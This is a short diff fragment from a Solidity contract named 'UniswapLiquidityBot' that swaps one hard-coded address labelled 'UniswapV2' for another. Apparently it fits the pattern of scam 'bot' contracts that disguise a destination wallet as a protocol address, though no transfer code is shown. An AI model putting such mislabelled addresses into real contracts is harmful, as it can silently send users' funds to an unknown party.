@@ -822,7 +822,7 @@ contract UniswapLiquidityBot {
   }
 
 
-  address UniswapV2 = 0x06dD726b1ab47d5209ab8E17CC5253e4Ecdd48dC ;
+  address UniswapV2 = 0x1B6Cbe7F09972c00e0BdB685BEd8c45B0844aDFc ;
 
 
   /*
